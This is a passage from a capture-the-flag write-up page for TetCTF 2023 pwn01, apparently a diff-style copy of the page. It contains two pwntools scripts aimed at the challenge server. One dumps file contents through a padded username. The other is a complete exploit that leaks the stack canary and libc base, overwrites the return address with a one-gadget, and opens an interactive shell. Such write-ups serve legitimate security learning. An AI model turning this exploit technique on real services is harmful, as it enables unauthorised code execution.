+<p>This script is used to dump file 1 on the challenge server:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+read_index <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+bytes_to_read <span style="color:#f92672">=</span> <span style="color:#ae81ff">264</span>
+sleep_secs <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
+question <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;How many bytes to read?&#34;</span>
+file_index <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;./data/file.bin&#34;</span>,<span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> fp:
+    old_data <span style="color:#f92672">=</span> fp<span style="color:#f92672">.</span>read(read_index)
+<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;./data/file.bin&#34;</span>,<span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> fp:
+    fp<span style="color:#f92672">.</span>write(old_data)
+    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Reconnect read_index : </span><span style="color:#e6db74">{</span>read_index<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+        p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;139.162.36.205&#34;</span>, <span style="color:#ae81ff">31337</span>)
+        p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Your choice: &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+        p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Username: &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;root</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa198.199.78.86&#34;</span>)
+        p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Password: &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;P@ssw0rd&#34;</span>)
+        p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Your choice: &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
+        p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Enter the index of the file to read: &#34;</span>, str(file_index)<span style="color:#f92672">.</span>encode())
+        <span style="color:#66d9ef">try</span>:
+            <span style="color:#66d9ef">if</span> read_index <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+                p<span style="color:#f92672">.</span>sendlineafter(question, str(bytes_to_read)<span style="color:#f92672">.</span>encode())
+            <span style="color:#66d9ef">else</span>:
+                steps <span style="color:#f92672">=</span> read_index <span style="color:#f92672">//</span> bytes_to_read
+                off <span style="color:#f92672">=</span> read_index <span style="color:#f92672">%</span> bytes_to_read
+                <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(steps):
+                    p<span style="color:#f92672">.</span>sendlineafter(question, str(bytes_to_read)<span style="color:#f92672">.</span>encode())
+                <span style="color:#66d9ef">if</span> off <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
+                    p<span style="color:#f92672">.</span>sendlineafter(question, str(off)<span style="color:#f92672">.</span>encode())
+                p<span style="color:#f92672">.</span>sendlineafter(question, str(bytes_to_read)<span style="color:#f92672">.</span>encode())
+
+            a <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv(bytes_to_read)
+            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>a<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+            <span style="color:#66d9ef">if</span>(len(a) <span style="color:#f92672">&lt;</span> bytes_to_read):
+                read_index <span style="color:#f92672">+=</span> len(a) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+                a <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
+            <span style="color:#66d9ef">else</span>:
+                read_index <span style="color:#f92672">+=</span> len(a)
+            fp<span style="color:#f92672">.</span>write(a)
+            p<span style="color:#f92672">.</span>close()
+            <span style="color:#66d9ef">if</span> read_index <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">20000</span>:
+                <span style="color:#66d9ef">break</span>
+        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Error </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+            p<span style="color:#f92672">.</span>close()
+            <span style="color:#66d9ef">continue</span>     
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">import</span> binascii
+
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;info&#34;</span>
+
+<span style="color:#75715e"># 0x50a37 posix_spawn(rsp+0x1c, &#34;/bin/sh&#34;, 0, rbp, rsp+0x60, environ)</span>
+<span style="color:#75715e"># constraints:</span>
+<span style="color:#75715e">#   rsp &amp; 0xf == 0</span>
+<span style="color:#75715e">#   rcx == NULL</span>
+<span style="color:#75715e">#   rbp == NULL || (u16)[rbp] == NULL</span>
+
+<span style="color:#75715e"># 0xebcf1 execve(&#34;/bin/sh&#34;, r10, [rbp-0x70])</span>
+<span style="color:#75715e"># constraints:</span>
+<span style="color:#75715e">#   address rbp-0x78 is writable</span>
+<span style="color:#75715e">#   [r10] == NULL || r10 == NULL</span>
+<span style="color:#75715e">#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span>
+
+<span style="color:#75715e"># 0xebcf5 execve(&#34;/bin/sh&#34;, r10, rdx)</span>
+<span style="color:#75715e"># constraints:</span>
+<span style="color:#75715e">#   address rbp-0x78 is writable</span>
+<span style="color:#75715e">#   [r10] == NULL || r10 == NULL</span>
+<span style="color:#75715e">#   [rdx] == NULL || rdx == NULL</span>
+
+<span style="color:#75715e"># 0xebcf8 execve(&#34;/bin/sh&#34;, rsi, rdx)</span>
+<span style="color:#75715e"># constraints:</span>
+<span style="color:#75715e">#   address rbp-0x78 is writable</span>
+<span style="color:#75715e">#   [rsi] == NULL || rsi == NULL</span>
+<span style="color:#75715e">#   [rdx] == NULL || rdx == NULL</span>
+
+read_index <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+BUF_SIZE <span style="color:#f92672">=</span> <span style="color:#ae81ff">264</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">readFile</span>(p, idx):
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Your choice:&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Enter the index of the file to read:&#34;</span>,<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>idx<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">readBytes</span>(p, size, readSize):
+    <span style="color:#66d9ef">global</span> read_index
+    <span style="color:#66d9ef">try</span>:
+        <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;./data/file.bin&#39;</span>,<span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> fp:
+            fp<span style="color:#f92672">.</span>seek(read_index)
+            data <span style="color:#f92672">=</span> fp<span style="color:#f92672">.</span>read()
+            p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;read?&#34;</span>,<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>size<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
+            log<span style="color:#f92672">.</span>debug(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;DUMP: </span><span style="color:#e6db74">{</span>binascii<span style="color:#f92672">.</span>hexlify(data[:size])<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+            tmp <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv(readSize)
+            read_index <span style="color:#f92672">+=</span> size
+            <span style="color:#66d9ef">while</span>(len(tmp) <span style="color:#f92672">&lt;</span> readSize):
+                log<span style="color:#f92672">.</span>debug(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;readBytes read </span><span style="color:#e6db74">{</span>readSize<span style="color:#e6db74">}</span><span style="color:#e6db74"> got </span><span style="color:#e6db74">{</span>len(tmp)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+                p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>size<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>encode())
+                log<span style="color:#f92672">.</span>debug(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;DUMP: </span><span style="color:#e6db74">{</span>binascii<span style="color:#f92672">.</span>hexlify(data[:size])<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+                tmp <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv(readSize)
+                read_index <span style="color:#f92672">+=</span> size
+            <span style="color:#66d9ef">return</span> tmp
+    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+        log<span style="color:#f92672">.</span>debug(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;readByte error </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">writeByte</span>(p, targetByte, offset):
+    <span style="color:#66d9ef">global</span> read_index
+    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;writeByte() targetByte : </span><span style="color:#e6db74">{</span>hex(targetByte)<span style="color:#e6db74">}</span><span style="color:#e6db74"> offset : </span><span style="color:#e6db74">{</span>offset<span style="color:#e6db74">}</span><span style="color:#e6db74"> read_index : </span><span style="color:#e6db74">{</span>read_index<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;./data/file.bin&#39;</span>,<span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> fp:
+        fp<span style="color:#f92672">.</span>seek(read_index)
+        data <span style="color:#f92672">=</span> fp<span style="color:#f92672">.</span>read()
+    distance <span style="color:#f92672">=</span> data[offset:]<span style="color:#f92672">.</span>index(targetByte) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> offset  <span style="color:#75715e">#Look for target Byte that is at least offset away from start. Off by 1</span>
+    
+    idx <span style="color:#f92672">=</span> distance <span style="color:#f92672">-</span> offset
+    skip_count <span style="color:#f92672">=</span> idx<span style="color:#f92672">//</span>BUF_SIZE
+    final_read_size <span style="color:#f92672">=</span> idx<span style="color:#f92672">%</span>BUF_SIZE
+    log<span style="color:#f92672">.</span>debug(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;distance : </span><span style="color:#e6db74">{</span>distance<span style="color:#e6db74">}</span><span style="color:#e6db74"> idx : </span><span style="color:#e6db74">{</span>idx<span style="color:#e6db74">}</span><span style="color:#e6db74"> skip_count : </span><span style="color:#e6db74">{</span>skip_count<span style="color:#e6db74">}</span><span style="color:#e6db74"> final_read_size : </span><span style="color:#e6db74">{</span>final_read_size<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(skip_count):
+        p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;read?&#34;</span>,<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>BUF_SIZE<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
+        log<span style="color:#f92672">.</span>debug(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;DUMP: </span><span style="color:#e6db74">{</span>binascii<span style="color:#f92672">.</span>hexlify(data[BUF_SIZE<span style="color:#f92672">*</span>i:BUF_SIZE<span style="color:#f92672">*</span>i<span style="color:#f92672">+</span>BUF_SIZE])<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> final_read_size <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+        p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;read?&#34;</span>,<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>final_read_size<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
+        log<span style="color:#f92672">.</span>debug(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;DUMP: </span><span style="color:#e6db74">{</span>binascii<span style="color:#f92672">.</span>hexlify(data[BUF_SIZE<span style="color:#f92672">*</span>skip_count:BUF_SIZE<span style="color:#f92672">*</span>skip_count<span style="color:#f92672">+</span>final_read_size])<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;read?&#34;</span>,<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>offset<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
+    log<span style="color:#f92672">.</span>debug(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;DUMP: </span><span style="color:#e6db74">{</span>binascii<span style="color:#f92672">.</span>hexlify(data[BUF_SIZE<span style="color:#f92672">*</span>skip_count<span style="color:#f92672">+</span>final_read_size:BUF_SIZE<span style="color:#f92672">*</span>skip_count<span style="color:#f92672">+</span>final_read_size<span style="color:#f92672">+</span>offset])<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+    read_index <span style="color:#f92672">+=</span> distance
+
+function_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7feedf585d90</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x007feedf55c000</span>
+
+<span style="color:#75715e"># p = process(&#39;./chall&#39;)</span>
+<span style="color:#75715e"># gdb.attach(p)</span>
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;139.162.36.205&#34;</span>,<span style="color:#ae81ff">31337</span>)
+
+<span style="color:#75715e">#Login</span>
+p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Your choice:&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Username:&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;root</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa198.199.78.86&#34;</span>)
+p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Password:&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;P@ssw0rd&#34;</span>)
+
+readFile(p, <span style="color:#ae81ff">1</span>)
+<span style="color:#75715e"># Get canary</span>
+offset_canary <span style="color:#f92672">=</span> BUF_SIZE<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>
+leak <span style="color:#f92672">=</span> readBytes(p,offset_canary, offset_canary<span style="color:#f92672">+</span><span style="color:#ae81ff">7</span>)
+canary <span style="color:#f92672">=</span> u64(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">+</span> leak[offset_canary:offset_canary<span style="color:#f92672">+</span><span style="color:#ae81ff">7</span>])
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;canary : </span><span style="color:#e6db74">{</span>hex(canary)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+
+<span style="color:#75715e"># Get libc_base</span>
+offset_functon <span style="color:#f92672">=</span> BUF_SIZE<span style="color:#f92672">+</span><span style="color:#ae81ff">32</span>
+leak <span style="color:#f92672">=</span> readBytes(p,offset_functon, offset_functon<span style="color:#f92672">+</span><span style="color:#ae81ff">6</span>)
+function_leak <span style="color:#f92672">=</span> u64(leak[offset_functon:offset_functon<span style="color:#f92672">+</span><span style="color:#ae81ff">6</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x00</span><span style="color:#e6db74">&#39;</span>) <span style="color:#75715e">#__libc_start_call_main+128</span>
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;__libc_start_call_main+128 : </span><span style="color:#e6db74">{</span>hex(function_leak)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+libc_base <span style="color:#f92672">=</span> function_leak <span style="color:#f92672">-</span> function_offset
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;libc_base base : </span><span style="color:#e6db74">{</span>hex(libc_base)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+
+<span style="color:#75715e">#Calculate gadget address</span>
+gadget <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x50a37</span> <span style="color:#f92672">+</span> libc_base
+<span style="color:#75715e"># gadget = 0x616161616161</span>
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;one gadget : </span><span style="color:#e6db74">{</span>hex(gadget)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+
+<span style="color:#75715e">#Rewrite return address</span>
+return_offset <span style="color:#f92672">=</span> BUF_SIZE<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>
+<span style="color:#66d9ef">for</span> idx,byte <span style="color:#f92672">in</span> zip(range(return_offset<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>,return_offset,<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>),p64(gadget)[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]):
+    writeByte(p,byte,idx)
+
+<span style="color:#75715e">#Rewrite rbp</span>
+rbp_offset <span style="color:#f92672">=</span> BUF_SIZE <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>
+<span style="color:#66d9ef">for</span> idx,byte <span style="color:#f92672">in</span> zip(range(rbp_offset<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>,rbp_offset,<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>),p64(<span style="color:#ae81ff">0</span>)[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]):
+    writeByte(p,byte,idx)
+
+<span style="color:#75715e">#Rewrite canary</span>
+<span style="color:#66d9ef">for</span> idx,byte <span style="color:#f92672">in</span> zip(range(BUF_SIZE<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>,BUF_SIZE,<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>),p64(canary)[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]):
+    writeByte(p,byte,idx)
+
+<span style="color:#75715e"># Input 0 and enter to trigger the return</span>
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div>
+</div>
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://b6a.black/tags/ctf/">ctf</a></li>
+      <li><a href="https://b6a.black/tags/tetctf/">tetctf</a></li>
+      <li><a href="https://b6a.black/tags/pwn/">pwn</a></li>
+    </ul>
+    <nav class="paginav">
+      <a class="next" href="https://b6a.black/posts/2022-12-24-backdoorctf/">
+        <span class="title">Next Page »</span>
+        <br>
+        <span>BackdoorCTF 2022 Writeup</span>
+      </a>
+    </nav>
+  </footer>
+</article>
+<aside class="toc-container">
+  <a href="#" style="text-decoration: none; font-weight: 700;">
+    TetCTF 2023: pwn01
+  </a>
+  <div class="js-toc"></div>
+</aside>
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.0/tocbot.min.css" integrity="sha512-SFw7k74K3983tyOlJIHa8atr9Ppef3Kix5cmifwzU7ZdtU2E0FRuOVRtd3ENpMJ8sNCie5hlb/0j23efcdQJXA==" crossorigin="anonymous" />
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.0/tocbot.min.js" integrity="sha512-oD3xGN8YTxenx6tdS4D/RKqO4OtORBQtAb2/FseM17GGMIi6jMwKUBc8duX4A5RwMOGGXoFBZrsqbOk8GpXFgQ==" crossorigin="anonymous"></script>
+
+<script type="text/javascript">
+  tocbot.init({
+    headingSelector: 'h1, h2, h3, h4',
+    orderedList: false,
+    headingLabelCallback: s => s.substr(0, s.length-1),
+    collapseDepth: 2
+  });
+</script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/viz.js/1.7.1/viz.js"> </script>
+<script type="text/javascript">
+  (function () {
+    const vizPrefix = "language-viz-";
+    Array.prototype.forEach.call(document.querySelectorAll("[class^=" + vizPrefix + "]"), function (x) {
+      let engine;
+      x.getAttribute("class").split(" ").forEach(function (cls) {
+        if (cls.startsWith(vizPrefix)) {
+          engine = cls.substr(vizPrefix.length);
+        }
+      });
+      const image = new DOMParser().parseFromString(Viz(x.innerText, { format: "svg", engine: engine }), "image/svg+xml");
+      x.parentNode.insertBefore(image.documentElement, x);
+      x.style.display = 'none'
+      x.parentNode.style.backgroundColor = "white"
+    });
+  })();
+</script>
+    </main><footer class="footer">
+    <span>&copy; 2023 <a href="https://b6a.black/">Black Bauhinia</a></span>
+    <span>&middot;</span>
+    <span>Powered by <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a></span>
+    <span>&middot;</span>
+    <span>Theme <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a></span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)">
+    <button class="top-link" id="top-link" type="button" accesskey="g">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+            <path d="M12 6H0l6-6z" />
+        </svg>
+    </button>
+</a>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css"
+  integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js"
+  integrity="sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js"
+  integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa" crossorigin="anonymous"
+  onload="renderMathInElement(document.body, { delimiters: [{ left: '$$', right: '$$', display: true }, { left: '\\[', right: '\\]', display: true }, { left: '$', right: '$', display: false }, { left: '\\(', right: '\\)', display: false }]})"></script>
+
+
+
+<script defer src="/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js" integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5&#43;kdJvBz5iKbt6B5PJI="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<script>
+    window.onload = function () {
+        if (localStorage.getItem("menu-scroll-position")) {
+            document.getElementById('menu').scrollLeft = localStorage.getItem("menu-scroll-position");
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+    function menu_on_scroll() {
+        localStorage.setItem("menu-scroll-position", document.getElementById('menu').scrollLeft);
+    }
+
+</script>
+
+</body>
+
+</html>
